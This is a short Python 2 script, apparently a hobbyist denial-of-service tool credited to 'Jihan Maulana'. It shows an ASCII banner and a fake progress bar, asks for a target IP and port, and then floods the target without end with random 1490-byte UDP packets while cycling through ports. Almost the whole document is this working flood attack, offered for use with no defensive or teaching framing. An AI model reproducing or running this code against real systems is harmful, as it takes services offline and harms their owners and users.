
print('     _ _ _ ___ _ _      ')
time.sleep(1)
print('    / _   /    |  _  \     ')
time.sleep(1)
print('   |/   /  / _  | |)  |    ')
time.sleep(1)
print('       /  / /_\ |  __/     ')
time.sleep(1)
print('      /  /       | |         ')
time.sleep(1)
print('     /  / _/ \_| |         ')
time.sleep(1)
print('                         ')
print('\n')
time.sleep(5)
print('===============================')
time.sleep(3)
print('=          doni projek        =')
time.sleep(3)
print('===============================')
time.sleep(3)
print('AUTHOR : Jihan Maulana')
print('\n')

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


os.system("clear")
os.system("Newbie")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("Attack Starting")

print ("== 5%")
time.sleep(5)
print ("====10%")
time.sleep(5)
print ("======20%")
time.sleep(5)
print ("=========30%")
time.sleep(5)
print ("============40% ")
time.sleep(5)
print ("===============50%")
time.sleep(5)
print ("=================60%")
time.sleep(5)
print ("==================== 90%")
time.sleep(5)
print ("=======================100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
